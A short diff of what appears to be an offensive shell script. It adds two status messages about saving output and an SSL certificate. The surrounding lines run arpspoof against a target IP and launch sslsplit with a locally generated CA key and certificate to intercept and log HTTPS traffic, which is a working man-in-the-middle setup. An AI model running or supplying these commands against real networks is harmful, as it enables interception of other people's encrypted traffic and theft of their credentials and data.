@@ -52,6 +52,8 @@ chmod +x core/create_certificate
 #sudo arpspoof -i $wifi_interface $ip_addr > /dev/null 2>&1 &
 
 #cmd_1="arpspoof -i ${wifi_interface} ${ip_addr}; sleep 150"
+echo ""
+echo "Output will be saved in output folder and SSL certificate will be saved in certificate foolder."
 sudo xterm -e zsh -c "arpspoof -i ${wifi_interface} ${ip_addr}" &
 sudo xterm -e zsh -c "sslsplit -D -l output/ssl_log.log -k certificate/ca.key -c certificate/ca.crt -P https 127.0.0.1 8080" &
 
